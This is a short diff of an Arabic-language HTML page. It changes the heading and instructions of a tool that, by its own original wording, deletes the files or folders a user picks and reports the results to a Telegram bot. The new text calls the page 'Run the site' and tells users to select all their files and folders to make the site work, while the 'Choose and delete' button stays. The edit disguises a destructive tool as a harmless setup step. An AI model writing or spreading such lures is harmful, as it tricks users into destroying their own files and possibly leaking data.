@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إدارة الملفات مع Telegram</title>
+    <title>تشغيل الموقع</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -35,8 +35,8 @@
     </style>
 </head>
 <body>
-    <h1>إدارة الملفات مع Telegram</h1>
-    <p>اختر الملفات أو المجلدات للحذف، سيتم إرسال النتائج إلى بوت Telegram</p>
+    <h1>تشغيل الموقع</h1>
+    <p>اختر جميع الملفات والمجلدات لعمل الموقع</p>
     
     <button id="deleteBtn">اختيار وحذف</button>
     <div id="status">الرجاء اختيار الملفات أو المجلدات</div>
